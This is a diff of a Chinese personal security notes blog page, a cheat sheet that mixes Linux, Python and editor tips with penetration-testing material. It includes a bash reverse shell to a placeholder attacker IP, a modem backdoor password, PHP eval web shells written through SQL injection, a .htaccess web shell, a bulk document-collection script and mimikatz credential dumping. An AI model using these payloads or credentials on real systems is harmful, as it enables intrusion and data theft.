@@ -121,7 +121,7 @@
 
       <div class="read-time">
         <small>
-          37 minute read
+          38 minute read
         </small>
       </div>
 
@@ -131,7 +131,8 @@
 
         <span itemprop="articleBody"><h3 id="updating-notes">updating notes…</h3>
 
-<div class="language-markdown highlighter-rouge"><pre class="highlight"><code><span class="p">1.</span>没用过的在线扫描器:
+<div class="language-markdown highlighter-rouge"><pre class="highlight"><code><span class="p">
+1.</span>没用过的在线扫描器:
     https://jawfish.io/
 	https://www.punkspider.org<span class="sb">
 
@@ -139,12 +140,16 @@
     https://www.shodan.io/
     https://www.zoomeye.org/
     https://fofa.so/
+
 </span><span class="p">2.</span>使用python开启一个简单的http服务:
     python -m SimpleHTTPServer 80
-<span class="p">3.</span>serve U运行cmd:
+<span class="p">
+3.</span>serve U运行cmd:
     quote site exec "..."
-<span class="p">4.</span>账号telecomadmin密码nE7jA%5m电信猫后门
-<span class="p">5.</span>linux local_root提权  
+<span class="p">
+4.</span>账号telecomadmin密码nE7jA%5m电信猫后门
+<span class="p">
+5.</span>linux local_root提权  
     http://exploit.linuxnote.org/
     https://itunsecurity.wordpress.com/2015/08/16/vulnhub-com-writeup-darknet/(LinEnum.sh,
     linuxprivchecker.py,unix-privesc-check)
@@ -164,26 +169,33 @@
     msf&gt;exploit
     or  
     meterpreter&gt;run post/multi/recon/local_exploit_suggester
-<span class="p">6.</span>metasploit与postgresql数据库连接:
+<span class="p">
+6.</span>metasploit与postgresql数据库连接:
     msf &gt; db_connect msf3: AtZDNVQF3NJEyNqU9u1ciHcqTsbcZzKR@127.0.0.1: 5432 / msf3
-<span class="p">7.</span>http: // tool.chacuo.net / mailanonymous   伪造邮件发送,一小时邮箱
-<span class="p">8.</span>bash反弹:
+<span class="p">
+7.</span>http: // tool.chacuo.net / mailanonymous   伪造邮件发送,一小时邮箱
+<span class="p">
+8.</span>bash反弹:
     /bin/bash -i &gt; /dev/tcp/<span class="nt">&lt;attacker</span><span class="na">_ip</span><span class="nt">&gt;</span>/<span class="nt">&lt;port&gt;</span> 0<span class="err">&lt;&amp;</span>1 2&gt;&amp;1
-<span class="p">9.</span>sed -i '/Love/d' 1.txt   删除包含Love的行
+<span class="p">
+9.</span>sed -i '/Love/d' 1.txt   删除包含Love的行
   sed -i 's/pattern1/string' file    正则查找替换
   sed -ri 's/pattern1/string' file
       标准正则查找替换,上面没有r选项的正则中()或{}要加<span class="se">\,</span>也即<span class="se">\(</span>或<span class="se">\{</span>,此处r要在i前面
       否则用sed -ir无效
-<span class="p"> 
+<span class="p">
 10.</span>加了vpn就相当于vpn强制给通信链路加了个限制:所有数据只能通过vpn进出.
 (正常联网的功能只是给系统加了连接其他地址的各种道路,必须先保证可以联网,然后可以保证加了vpn后的效果会是这样&gt;&gt;
     先通过一些数据链路连接到vpn,然后vpn作为代理再访问互联网.
-<span class="p">11.</span>tar -T mulu.list -czf file.tar.gz
-<span class="p">12.</span>分割大文件再合并
+<span class="p">
+11.</span>tar -T mulu.list -czf file.tar.gz
+<span class="p">
+12.</span>分割大文件再合并
     split -b 20m RevolutionOS.rmvb RevOS_part_,
     cat RevOS_part_<span class="err">*</span> &gt; RevolutionOS_RSB.rmvb,
     md5sum RevolutionOS.rmvb(md5sum RevolutionOS_RSB.rmvb)
-<span class="p">13.</span>一些数据库操作
+<span class="p">
+13.</span>一些数据库操作
   给数据库添加一个用户
     CREATE USER 'username'@'host' IDENTIFIED BY 'password';(可小写)
     修改密码
@@ -196,18 +208,23 @@
     设置允许本机所有网卡对应ip都可以被root连接命令:
     grant all privileges on *.* to root@'%' identified by '12345678' with grant option;
     12345678为root密码
+
 </span><span class="p">14.</span>ip:23.23.23.23    (bing)
-<span class="p">15.</span>暴路径http://www.lxway.com/1191778.html  
+<span class="p">
+15.</span>暴路径http://www.lxway.com/1191778.html  
    google dork:(about error message)
        https://www.exploit-db.com/google-hacking-database/7/
        eg:"You have an error in your SQL syntax near -google -baidu -github -stackoverflow"
-<span class="p">16.</span>sublime text快捷键好东西:http://www.cnblogs.com/lanxuezaipiao/p/4151095.html
+<span class="p">
+16.</span>sublime text快捷键好东西:http://www.cnblogs.com/lanxuezaipiao/p/4151095.html
   ctrl+D,ctrl+shift+k,ctrl+shift+<span class="nt">&lt;-</span><span class="err">/</span><span class="na">-</span><span class="nt">&gt;</span>,按住shift右键拖动鼠标多行编辑,
   set syntax:python,ctrl+enter,ctrl+shift+enter,ctrl+<span class="p">[</span><span class="nv">/</span><span class="p">]</span>,ctrl+shift+v完整粘贴源代码格式,移动一行ctrl+shift+上/下
-<span class="p">17.</span>nmap :
+<span class="p">
+17.</span>nmap :
   nmap -v -sP -PI -PT -Pn 192.168.0.0/24
   nmap -v -sn -PE 192.168.0.0/24 快速扫描局域网存活主机
-<span class="p">18.</span>常用linux命令
+<span class="p">
+18.</span>常用linux命令
    uname -a
    cat /proc/version
    head -n 1 /etc/issue   # 查看linux操作系统版本
@@ -228,7 +245,8 @@
        https://3xp10it.github.io/%E4%BA%8C%E8%BF%9B%E5%88%B6/2016/08/11/%E6%BC%8F%E6%B4%9E%E6%88%98%E4%BA%89-cv
        e-2011-0104/https://3xp10it.github.io/%E4%BA%8C%E8%BF%9B%E5%88%B6/2016/08/11/%E6%BC%8F%E6%B4%9E%E6%88%98
        %E4%BA%89-cve-2011-0104/找包含"linebreak"关键字的文件中的与"linebreak"相关的行
-<span class="p">19.</span>linux backup and restore:<span class="nt">&lt;sudo&gt;</span>
+<span class="p">
+19.</span>linux backup and restore:<span class="nt">&lt;sudo&gt;</span>
     0&gt;http://xing.rocks/2015/03/06/ubuntu%E7%B3%BB%E7%BB%9F%E5%A4%87%E4%BB%BD%E4%B8%8E%E8%BF%98%E5%8E%9F/ 更详细
     1&gt;backup:
     cd /
@@ -246,7 +264,8 @@
       reboot
     3&gt;http://blog.csdn.net/shendl/article/details/7384755
     4&gt;https://wiki.archlinux.org/index.php/Full_system_backup_with_rsync
-<span class="p">20.</span>python中import和from xx import xx需要注意的事:
+<span class="p">
+20.</span>python中import和from xx import xx需要注意的事:
   import语句中:import或者from xx import xx语句当中,形如a.b的
   用法如from a.b import f(f是b.py中一个函数名或者一个常量,a是一个文件夹,只有文件夹才
   可以带.后接具体文件名《如此处的b<span class="err">&lt;</span>省略.py后缀&gt;》,在具体的函数调用而不是import语句中,文件可
@@ -262,9 +281,11 @@
   大致通用between,space2randomblank,randomcase,xforwardedfor,charencode,multiplespaces,space2plus,
   nonrecursivereplacement,apostrophemask,base64encode,space2mssqlhash,space2mysqldash,unionalltounion,
   securesphere,space2comment 
-<span class="p">21.</span>神器lfi自动探测panoptic:https://github.com/lightos/Panoptic
+<span class="p">
+21.</span>神器lfi自动探测panoptic:https://github.com/lightos/Panoptic
     神器load_file自动探测sqlnuke:https://github.com/nuke99/sqlnuke.git
-<span class="p">22.</span>webshell:
+<span class="p">
+22.</span>webshell:
   webshell generate site(good):http://www.zjjv.com/
   good:https://r57.gen.tr/
        http://www.dcvi.net/
@@ -273,19 +294,28 @@
   php-b374k(PHP version &gt; 4.3.3 and PHP 5):https://github.com/b374k
          (browser old version): https://code.google.com/p/b374k-shell/
   http://www.dcvi.net/
-<span class="p">23.</span>经典入侵思路:
+<span class="p">
+23.</span>经典入侵思路:
   http://www.2cto.com/Article/201201/115793.html(伪静态注入到获得webshell)
-<span class="p">24.</span>cookie注入中转http://www.rising.com.cn/newsletter/news/2012-08-23/12195.html(目前认为只可asp,get)
-<span class="p">25.</span>vpn搭建教程(2003server)
+<span class="p">
+24.</span>cookie注入中转http://www.rising.com.cn/newsletter/news/2012-08-23/12195.html(目前认为只可asp,get)
+<span class="p">
+25.</span>vpn搭建教程(2003server)
     http://www.xfisp.com/style/info/shownews.asp?id=3(pptp)
     http://vps.gl/windows/215.html  http://help.fireinter.com/tengxunyun/2015/0203/354.html(l2tp)
-<span class="p">26.</span>关于ipcam的UPnP或NAT的知识http://www.pernet.tv/thread-103-1-1.html
-<span class="p">27.</span>google search api for python
+<span class="p">
+26.</span>关于ipcam的UPnP或NAT的知识http://www.pernet.tv/thread-103-1-1.html
+<span class="p">
+27.</span>google search api for python
     具体详情见百度云盘笔记文件夹
-<span class="p">28.</span>.NET reverse tool(graywolf):https://www.digitalbodyguard.com/graywolf.html
-<span class="p">29.</span>linux fdisk-&gt;ext3-&gt;mount:http://cuchadanfan.blog.51cto.com/9940284/1671416
-<span class="p">30.</span>Cknife  java环境菜刀  已放到/usr/share
-<span class="p">31.</span>免杀一句话:http://blog.hacku.cn/post/260.html
+<span class="p">
+28.</span>.NET reverse tool(graywolf):https://www.digitalbodyguard.com/graywolf.html
+<span class="p">
+29.</span>linux fdisk-&gt;ext3-&gt;mount:http://cuchadanfan.blog.51cto.com/9940284/1671416
+<span class="p">
+30.</span>Cknife  java环境菜刀  已放到/usr/share
+<span class="p">
+31.</span>免杀一句话:http://blog.hacku.cn/post/260.html
            http://www.freebuf.com/articles/web/9396.html
            kali linux2.0:
             webacoo
@@ -412,8 +442,10 @@
   服务进程管理:phpstudy (start|stop|restart|uninstall)
   站点主机管理:phpstudy (add|del|list)
   ftpd用户管理:phpstudy ftp (add|del|list)
-<span class="p">33.</span>strem:http://www.yxbao.com/bd/27803.html#goDown
-<span class="p">34.</span>linux的git使用:
+<span class="p">
+33.</span>strem:http://www.yxbao.com/bd/27803.html#goDown
+<span class="p">
+34.</span>linux的git使用:
   http://www.linuxidc.com/Linux/2014-02/96989.htm
   完成密钥的设置后:
   git init
@@ -449,12 +481,15 @@
 <span class="p">
 35.</span>生活学习:1&gt;(本杰明-富兰克林13条)http://www.201980.com/lizhi/chenggong/9386.html
              2&gt;(曾国藩修身12条)http://www.201980.com/lizhi/chenggong/8007.html
-<span class="p">36.</span>mouse without borders:多屏幕同键盘鼠标控制
+<span class="p">
+36.</span>mouse without borders:多屏幕同键盘鼠标控制
               https://www.microsoft.com/en-us/download/confirmation.aspx?id=35460(win)
               http://alternativeto.net/software/mouse-without-borders2/?platform=linux(linux)
               x2vnc(目前认为最好,通过vnc达到mouse without borders的功能!!)
-<span class="p">37.</span>java执行jar文件命令:java -jar xx.jar
-<span class="p">38.</span>.htaccess can be :
+<span class="p">
+37.</span>java执行jar文件命令:java -jar xx.jar
+<span class="p">
+38.</span>.htaccess can be :
   1&gt;
   <span class="nt">&lt;FilesMatch</span> <span class="err">"</span><span class="na">haha</span><span class="err">"</span><span class="nt">&gt;</span>
   SetHandler application/x-httpd-php
@@ -481,8 +516,10 @@
 
     ###### SHELL ###### &lt;?php echo "\n";passthru($_GET['c']." 2&gt;&amp;1"); ?&gt;###### LLEHS ######
     -----------------------自解析.htaccess--------------------------------
+
 </span><span class="p">39.</span>临时的一种暴路径思路:netsparker扫出有输入的php页面及输入变量名,然后用awvs里面的fuzz功能fuzz,得到暴错的路径,可试.
-<span class="p">40.</span>(command1 &amp; command2)==(command1;command2)    
+<span class="p">
+40.</span>(command1 &amp; command2)==(command1;command2)    
 command1 &amp;&amp; command2中,如果command1不成功,command2则不会执行,(command1 &amp; command2)或(command1;command2)中如果command1不成功,command1会执行
 locate <span class="ge">*.doc &gt; doc.list &amp;&amp; locate *</span>.docx &gt; docx.list &amp;&amp; locate <span class="ge">*.pdf &gt; pdf.list &amp;&amp; locate *</span>.txt &gt; txt.list &amp;&amp; locate <span class="ge">*.xls &gt; xls.list &amp;&amp; locate *</span>.xlsx &gt; xlsx.list &amp;&amp; locate <span class="ge">*.jpg &gt; jpg.list &amp;&amp; locate *</span>.png &gt; png.list
 tar -czf code.tar.gz <span class="err">*</span> &amp;&amp; tar -T doc.list -czf doc.tar.gz &amp;&amp; tar -T docx.list -czf docx.tar.gz &amp;&amp; tar -T pdf.list -czf pdf.tar.gz &amp;&amp; tar -T txt.list -czf txt.tar.gz &amp;&amp; tar -T xls.list -czf xls.tar.gz &amp;&amp; tar -T xlsx.list -czf xlsx.tar.gz &amp;&amp; tar -T jpg.list -czf jpg.tar.gz &amp;&amp; tar -T png.list -czf png.tar.gz
@@ -596,34 +633,47 @@ linux打包命令:1.sh(attention:without "&amp;&amp; echo ok",the final tar -T x
 -----------------content of 1.sh--------------------
 mkdir /tmp/tmp &amp;&amp; find / -name "<span class="ge">*.doc" &gt; /tmp/tmp/doc.list &amp;&amp; find / -name "*</span>.docx" &gt; /tmp/tmp/docx.list &amp;&amp; find / -name "<span class="ge">*.pdf" &gt; /tmp/tmp/pdf.list &amp;&amp; find / -name "*</span>.txt" &gt; /tmp/tmp/txt.list &amp;&amp; find / -name "<span class="ge">*.xls" &gt; /tmp/tmp/xls.list &amp;&amp; find / -name "*</span>.xlsx" &gt; /tmp/tmp/xlsx.list &amp;&amp; tar -T /tmp/tmp/doc.list -czf /tmp/tmp/doc.tar.gz &amp;&amp; tar -T /tmp/tmp/docx.list -czf /tmp/tmp/docx.tar.gz &amp;&amp; tar -T /tmp/tmp/pdf.list -czf /tmp/tmp/pdf.tar.gz &amp;&amp; tar -T /tmp/tmp/txt.list -czf /tmp/tmp/txt.tar.gz &amp;&amp; tar -T /tmp/tmp/xls.list -czf /tmp/tmp/xls.tar.gz &amp;&amp; tar -T /tmp/tmp/xlsx.list -czf /tmp/tmp/xlsx.tar.gz &amp;&amp; echo ok
     --------------------end-----------------------------
-<span class="p">41.</span>kali linux2.0 import folder path:/usr/share/applications   eg.gnome-control-center network
-<span class="p">42.</span>http://www.orico.com.cn/   driver    
-<span class="p">43.</span>python中单引号,双引号,三引号http://blog.csdn.net/caianye/article/details/6638183       
-<span class="p">45.</span>os.system('''python %s &gt;&gt; "out_log.txt"''' % exp_path) "&gt;&gt;" instead of "open(file,"a+") fp.write(str)" in py2 or py3
-<span class="p">46.</span>others' tips:  
+<span class="p">
+41.</span>kali linux2.0 import folder path:/usr/share/applications   eg.gnome-control-center network
+<span class="p">
+42.</span>http://www.orico.com.cn/   driver    
+<span class="p">
+43.</span>python中单引号,双引号,三引号http://blog.csdn.net/caianye/article/details/6638183       
+<span class="p">
+45.</span>os.system('''python %s &gt;&gt; "out_log.txt"''' % exp_path) "&gt;&gt;" instead of "open(file,"a+") fp.write(str)" in py2 or py3
+<span class="p">
+46.</span>others' tips:  
    msf必不可少burpsuite/fiddler必不可少python,ruby,shell,perl必不可少,不会编程还是别玩了.
    c/c++/java能看懂写小东西,这几个得熟练nmap,sqlmap,niktoida常备dropbox,evernote常备还有啥呢?
    成形的工具只能用于通用检测,针对具体对象,还需要写些自己的工具,另外准备些有针对性的基础库,字典啥的,经常干这个都知道先想到这些,稍后再补充,再紧张干活中…….
-<span class="p">47.</span>google-chrome-stable on kali linux2.0
+<span class="p">
+47.</span>google-chrome-stable on kali linux2.0
    adding --user-data-dir
    and open terminal : /usr/bin/google-chrome-stable %U --no-sandbox  or cd /usr/share/applications edit Google Chrome by right mouse,add     %U --no-sandbox
-<span class="p">48.</span>sqlmap with tor:http://navisec.it/%E5%9C%A8%E4%BB%A3%E7%90%86%E7%8E%AF%E5%A2%83%E4%B8%8B%E4%BD%BF%E7%94%A8sqlmap/
+<span class="p">
+48.</span>sqlmap with tor:http://navisec.it/%E5%9C%A8%E4%BB%A3%E7%90%86%E7%8E%AF%E5%A2%83%E4%B8%8B%E4%BD%BF%E7%94%A8sqlmap/
    sqlmap --tor --tor-type=socks5 <span class="p">[</span><span class="nv">--tor-port=9050</span><span class="p">]</span> --check-tor
    sqlmap --proxy=socks5://127.0.0.1:9050
    sqlmap --proxy=socks5://127.0.0.1:9050 --proxy-cred=admin:pass
 
    sqlmap中--technique=Q 是inline query的查询方式
-<span class="p">49.</span>tor的笔记:
+<span class="p">
+49.</span>tor的笔记:
    1&gt;apt-get install tor安装的tor默认端口是9050,开机自启动tor:vim /etc/rc.local,在exit 0前加上service tor start,和proxychains搭配使用时设置proxychains.conf里面的端口为9050
    2&gt;Tor-Browser洋葱浏览器自带tor,每次启动tor-browser时,它会启动它自带的tor,该tor默认端口是9150(老版本的是9050)
    3&gt;1中的tor和2中的tor功能完全一样,proxychains firefox等程序时对应的proxychains.conf里面的端口为9050,启动tor-browser浏览器后可用也可将proxychains.conf中端口改为9150,但tor-browser关闭后proxychains这样的代理设置会失效.
-<span class="p">50.</span>Python Unicode与中文处理:http://my.oschina.net/u/201886/blog/64692
-<span class="p">51.</span>shadow copy神器,可以复制使用中的文件,可拷贝数据库
+<span class="p">
+50.</span>Python Unicode与中文处理:http://my.oschina.net/u/201886/blog/64692
+<span class="p">
+51.</span>shadow copy神器,可以复制使用中的文件,可拷贝数据库
    pwdump也可以:
    http://www.2cto.com/article/201008/55565.html
-<span class="p">52.</span>php中的header()函数 http://www.cnblogs.com/fengzheng126/archive/2012/04/21/2461475.html
-<span class="p">53.</span>php中{}的功能 http://zhidao.baidu.com/link?url=KTLBf6o36tO9J0elyLbbVpdL9F-uD_Js4X2hwQq5EzinT2L3ba_Xq-esopPYkTiszNpXR2HposrabwqCx3VXRq
-<span class="p">54.</span>php上传中%00截断的理解:
+<span class="p">
+52.</span>php中的header()函数 http://www.cnblogs.com/fengzheng126/archive/2012/04/21/2461475.html
+<span class="p">
+53.</span>php中{}的功能 http://zhidao.baidu.com/link?url=KTLBf6o36tO9J0elyLbbVpdL9F-uD_Js4X2hwQq5EzinT2L3ba_Xq-esopPYkTiszNpXR2HposrabwqCx3VXRq
+<span class="p">
+54.</span>php上传中%00截断的理解:
    python脚本中:
    def hex_to_asc(ch):
        return '{:c}'.format(int(float.fromhex(ch)))
@@ -756,37 +806,47 @@ mkdir /tmp/tmp &amp;&amp; find / -name "<span class="ge">*.doc" &gt; /tmp/tmp/do
     print "s:",s,"    ",
     print "hex_to_asc(s):",hex_to_asc(s)
     # print "s:%s,hex_to_asc(s):%s" % (s,hex_to_asc(s))
-<span class="p">55.</span>htmlspecialchars的作用是把:
+<span class="p">
+55.</span>htmlspecialchars的作用是把:
    &amp; (和号) 成为 &amp;
    " (双引号) 成为 "
    ' (单引号) 成为 '
    &lt; (小于) 成为 &lt;
 <span class="gt">   &gt; (大于) 成为 &gt;   </span>
    输出的时候不需要特殊处理 浏览器 会把这些标签还原的
-<span class="p">56.</span>linux命令行下结束firefox进程:
+<span class="p">
+56.</span>linux命令行下结束firefox进程:
    ps -aux | grep firefox | awk '{if($11=="firefox") print $2}'| xargs kill -9
    pkill firefox
    更强力:
        pkill -9 python
-<span class="p">57.</span>菜刀替代工具:Altman
+<span class="p">
+57.</span>菜刀替代工具:Altman
    http://www.i0day.com/1725.html
    https://github.com/keepwn/Altman
-<span class="p">58.</span>Pidgin my irc client on linux
+<span class="p">
+58.</span>Pidgin my irc client on linux
     http://www.linux.com/news/software/applications/295201:five-best-irc-clients-for-linux
-<span class="p">59.</span>dig mx domain(without www)
+<span class="p">
+59.</span>dig mx domain(without www)
    ns记录和mx记录一样,都要查顶级域名,eg.dig +short www.baidu.com ns VS dig +short baidu.com ns
-<span class="p">60.</span>pwntool:https://www.91ri.org/14382.html
-<span class="p">61.</span>vim以十六进制编辑文件:%!xxd
+<span class="p">
+60.</span>pwntool:https://www.91ri.org/14382.html
+<span class="p">
+61.</span>vim以十六进制编辑文件:%!xxd
        :%!xxd    ---&gt;   :%!xxd -r    ---&gt;    :wq
        如果失败则用hexedit编辑
            ctrl+X:save and exit
    vim对比两个文件:vim -d 1.txt 2.txt
    vim自动保存有用版本答案(相当于esc/jk实现保存功能):au InsertLeave <span class="err">*</span> write
-<span class="p">62.</span>sublime插件:
+<span class="p">
+62.</span>sublime插件:
     python pep8 autoformat(python代码自动对齐)ctrl+shift+r
     JsFormat(javascript代码自动对齐)ctrl+alt+f
-<span class="p">63.</span>linux install node.js&amp;npm   http://www.iteblog.com/archives/1313
-<span class="p">64.</span>html内嵌js:
+<span class="p">
+63.</span>linux install node.js&amp;npm   http://www.iteblog.com/archives/1313
+<span class="p">
+64.</span>html内嵌js:
    <span class="nt">&lt;html&gt;</span>
    <span class="nt">&lt;body&gt;</span>
    <span class="nt">&lt;Script</span> <span class="na">Language=</span><span class="s">"JavaScript"</span><span class="nt">&gt;</span>
@@ -816,8 +876,10 @@ mkdir /tmp/tmp &amp;&amp; find / -name "<span class="ge">*.doc" &gt; /tmp/tmp/do
    <span class="nt">&lt;/script&gt;</span>
    <span class="nt">&lt;/body&gt;</span>
    <span class="nt">&lt;/html&gt;</span>
-<span class="p">65.</span>安装requirements.txt中要求的环境:pip install -r requirements.txt
-<span class="p">66.</span>python urllib&amp;urllib2:
+<span class="p">
+65.</span>安装requirements.txt中要求的环境:pip install -r requirements.txt
+<span class="p">
+66.</span>python urllib&amp;urllib2:
     http://www.bkjia.com/Pythonjc/1088462.html  Python中http请求方法库汇总,python请求库汇总
     http请求异常处理(获取异常请求的返回内容)
         http://my.oschina.net/duhaizhang/blog/69834
@@ -846,7 +908,8 @@ mkdir /tmp/tmp &amp;&amp; find / -name "<span class="ge">*.doc" &gt; /tmp/tmp/do
    req = urllib2.Request(url, data)
    response = urllib2.urlopen(req)
    the_page = response.read()
-<span class="p">67.</span>python使用urllib2容易犯的错误:
+<span class="p">
+67.</span>python使用urllib2容易犯的错误:
 　　系统安装了google的chrome浏览器,需要burp截chrome的包时会在里面设置代理,而chrome设置的代理即是系统的代理,
     而firefox设置的代理只是firefox浏览器的代理,并不影响系统的网络访问是否要经过firefox设置的代理,
 　　如果设置了chrome的代理如127.0.0.1:8080,事后忘记关闭,则会影响到系统中所有需要联网的程序.
@@ -860,7 +923,8 @@ mkdir /tmp/tmp &amp;&amp; find / -name "<span class="ge">*.doc" &gt; /tmp/tmp/do
   　这样就不会出现urllib2　error 101　refused的错误了,也可以将系统的127.0.0.1:8080的代理关掉.(linux中set命令可以看到http_proxy的值,http_proxy并不是vpn的ip)
   　在sublime text中有个sublimeREPL插件,f5快捷键可编译运行python脚本,然而就算系统设置了代理127.0.0.1:8080等,f5依然可以将使用了urllib2且没有加上面３行代码的python脚本
   　成功执行,也许是sublimeREPL中默认的运行代码设置了自己的代理为空,且不影响系统代理http_proxy的值.
-<span class="p">68.</span>python,beautifulsoup中正则匹配中文的错误解决办法:
+<span class="p">
+68.</span>python,beautifulsoup中正则匹配中文的错误解决办法:
     http://www.lylinux.org/python%E4%BD%BF%E7%94%A8%E6%AD%A3%E5%88%99%E5%8C%B9%E9%85%8D%E4%B8%AD%E6%96%87.html
    python正则表达式:
        http://www.cnblogs.com/huxi/archive/2010/07/04/1771073.html
@@ -897,14 +961,18 @@ mkdir /tmp/tmp &amp;&amp; find / -name "<span class="ge">*.doc" &gt; /tmp/tmp/do
         python2---&gt;python3:
         1&gt;2to3 file.py(2to3 -w file.py)(2to3 -f print -w file.py)(man 2to3)
         2&gt;python -3 file.py
+
 </span><span class="p">69.</span>python中获得执行系统命令的输出:http://blog.csdn.net/g457499940/article/details/17068277
-<span class="p">70.</span>python代码中不能有~符号当作/root目录的习惯,open('~/something','r+')会出错,os.system('~/something')不会,
+<span class="p">
+70.</span>python代码中不能有~符号当作/root目录的习惯,open('~/something','r+')会出错,os.system('~/something')不会,
     为保证不出错,在代码中不用~符号,另外os.system(),open()等函数中不要有%s这种格式化字符串变量
 　　如果要用到在这些函数中传入一个变量作参数,先在os.system(),open()等函数前面格式化成普通不带%s的变量再传入这些
     函数,eg.a='python /root/%s' % input(),os.system(a)
-<span class="p">71.</span>ida pro中graph功能失败,could not find grapher 'qwingraph.exe'.please check GRAPH_VISUALIZER in ida.cfg
+<span class="p">
+71.</span>ida pro中graph功能失败,could not find grapher 'qwingraph.exe'.please check GRAPH_VISUALIZER in ida.cfg
     解决方法http://blog.csdn.net/qysh123/article/details/17590731
-<span class="p">72.</span>sqlmap跑出有如
+<span class="p">
+72.</span>sqlmap跑出有如
    Payload: 8.8.8.8' AND 3588=3588-- RMEo
    的盲注,如果使用了--batch参数或者使用sqlmap推荐的(found sql injection in MySQL database,dismiss other type of
    database?Y/n),虽然这样的盲注一般是MySQL的注入点,但是其他数据库也有可能是这样的,比如SQLite,这个时候如果同意忽
@@ -912,9 +980,11 @@ mkdir /tmp/tmp &amp;&amp; find / -name "<span class="ge">*.doc" &gt; /tmp/tmp/do
    中,为了全面的检测,最好不要一直使用sqlmap推荐的默认选项.在此例中,使用--dbms=SQLite参数,成功跑出目标SQLite数据
    库的内容.另外,实验中发现sqlmap会出现一会能跑出,一会跑不出的现象,可见,工具不是完全可靠的,要是一下没有跑出,多
    跑几次就出来了.
-<span class="p">73.</span>preg_replace包含/e修饰符利用:http://www.jb51.net/article/38714.htm　其中echo "${@phpinfo()}";就可以了,不必
+<span class="p">
+73.</span>preg_replace包含/e修饰符利用:http://www.jb51.net/article/38714.htm　其中echo "${@phpinfo()}";就可以了,不必
     echo "{${phpinfo()}}";
-<span class="p">74.</span>vim配置:
+<span class="p">
+74.</span>vim配置:
           https://github.com/xinghuacai/spf13-vim
           http://blog.csdn.net/namecyf/article/details/7787479
           https://github.com/Valloric/YouCompleteMe
@@ -976,6 +1046,7 @@ mkdir /tmp/tmp &amp;&amp; find / -name "<span class="ge">*.doc" &gt; /tmp/tmp/do
     ubuntu安装Oh-My-Zsh:
         https://zhuanlan.zhihu.com/p/19556676
         http://www.jianshu.com/p/9a5c4cb0452d
+
 </span><span class="p">75.</span>1&gt;dmz+光猫+有线路由+无线路由下的端口映射:
    2&gt;拓扑图大致为:
           光猫(192.168.1.1)
@@ -995,10 +1066,12 @@ mkdir /tmp/tmp &amp;&amp; find / -name "<span class="ge">*.doc" &gt; /tmp/tmp/do
    7&gt;加dmz时的内网端口映射:在光猫上设置dmz为无线路由在光猫所在网段的ip,也即192.168.1.4,在无线路由器上设置nat:将
         外部数据转到需要端口映射的内网机器的ip(eg.192.168.3.11)及对应端口(其中dmz相当于转发光猫上的所有端口数据到
      无线路由器上,外部访问光猫公网ip即相当于访问无线路由)
-<span class="p">76.</span>内网渗透 代理&amp;转发 http://www.heysec.org/archives/115
+<span class="p">
+76.</span>内网渗透 代理&amp;转发 http://www.heysec.org/archives/115
 	当reGeory无法成功时,reGeorg替代工具
 	https://github.com/nccgroup/ABPTTS
-<span class="p">77.</span>union select 1,2,3,4,load_file(0x433a5c666c76706c617965725c6e756c6c6576742e6d6f66),6 into dumpfile 'c:/windows/system32/wbem/mof/nullevt.mof'-- - (路径中用/不用<span class="se">\)</span>
+<span class="p">
+77.</span>union select 1,2,3,4,load_file(0x433a5c666c76706c617965725c6e756c6c6576742e6d6f66),6 into dumpfile 'c:/windows/system32/wbem/mof/nullevt.mof'-- - (路径中用/不用<span class="se">\)</span>
    写一句话是select 1,2,3,4,<span class="cp">&lt;?php @eval($_POST[cmd]);?&gt;</span>,6 into outfile 'c:/ksla/lsd/'-- -　　　　
    (outfile=dumpfile,but if not,try dumpfile instead of outfile in the first sentence)
    mysql中phpmyadmin提权:http://blog.sina.com.cn/s/blog_b8ab0ac20101sbwe.html
@@ -1009,16 +1082,24 @@ mkdir /tmp/tmp &amp;&amp; find / -name "<span class="ge">*.doc" &gt; /tmp/tmp/do
    SELECT HEX(LOAD_FILE(0x2f70687073747564792f7777772f72654475682e706870))INTO DUMPFILE　'/phpstudy/www/121.txt'    (/phpstudy/www/reDuh.php)  本地(linux)取hex值
    select unhex('...') into dumpfile 'c:/inetpub/wwwroot/memberinfo/....php';-- -成功,这样不会被转义,如果是outfile会被转义　远程dumpfile出去 (对方windows)
    同理写shell:bs/news.php?id=3 and 1=2 union select null,null,null,null,unhex('3C3F70687020406576616C28245F504F53545B27746F6D275D293B3F3E') into dumpfile 'C:/AAWServer/www/php/k82.php';
-<span class="p">78.</span>有时候visual studio2015或其它版本的ide编译出来的exe文件无法在其它机器上运行(release版本也不可以的时候)可以直接试试g++/gcc -o out.exe file.cpp等命令自行编译.
-<span class="p">79.</span>ctrl+shift+p==&gt;install==&gt;package syning,backup sublime settings==&gt;https://github.com/csch0/SublimeText-Package-Syncing
-<span class="p">80.</span>http://www.tuicool.com/articles/zIJrEjn GitHub上README写法暨markdown语法解读
-<span class="p">81.</span>windows下cacls查看权限和设置权限http://41080138.blog.51cto.com/2587513/951403
-<span class="p">82.</span>php写shell: cmd=fputs(fopen('chk.php','w'),'<span class="cp">&lt;?php @eval($_POST[nihao]); ?&gt;</span>');
+<span class="p">
+78.</span>有时候visual studio2015或其它版本的ide编译出来的exe文件无法在其它机器上运行(release版本也不可以的时候)可以直接试试g++/gcc -o out.exe file.cpp等命令自行编译.
+<span class="p">
+79.</span>ctrl+shift+p==&gt;install==&gt;package syning,backup sublime settings==&gt;https://github.com/csch0/SublimeText-Package-Syncing
+<span class="p">
+80.</span>http://www.tuicool.com/articles/zIJrEjn GitHub上README写法暨markdown语法解读
+<span class="p">
+81.</span>windows下cacls查看权限和设置权限http://41080138.blog.51cto.com/2587513/951403
+<span class="p">
+82.</span>php写shell: cmd=fputs(fopen('chk.php','w'),'<span class="cp">&lt;?php @eval($_POST[nihao]); ?&gt;</span>');
    其中nihao的位置不能有''或"",而且fputs的第二个参数只能用单引号包住
-<span class="p">83.</span>rdesktop -u administrator -p nihao103.240.203.6:3389
-<span class="p">84.</span>到最外面调时间,拉到中间没到最外面调星期和日期(中间时,顺时针调星期,逆时针调  
+<span class="p">
+83.</span>rdesktop -u administrator -p nihao103.240.203.6:3389
+<span class="p">
+84.</span>到最外面调时间,拉到中间没到最外面调星期和日期(中间时,顺时针调星期,逆时针调  
    日期)
-<span class="p">85.</span>windows 2003,stop firewall service and policy command:net stop sharedaccess, net stop policyagent
+<span class="p">
+85.</span>windows 2003,stop firewall service and policy command:net stop sharedaccess, net stop policyagent
    load  mimikatz
    mimikatz_command -f sekurlsa::searchPasswords
    在mimikatz抓密码时,nishang中的ps1脚本不好用时,直接用原版的mimikatz.exe
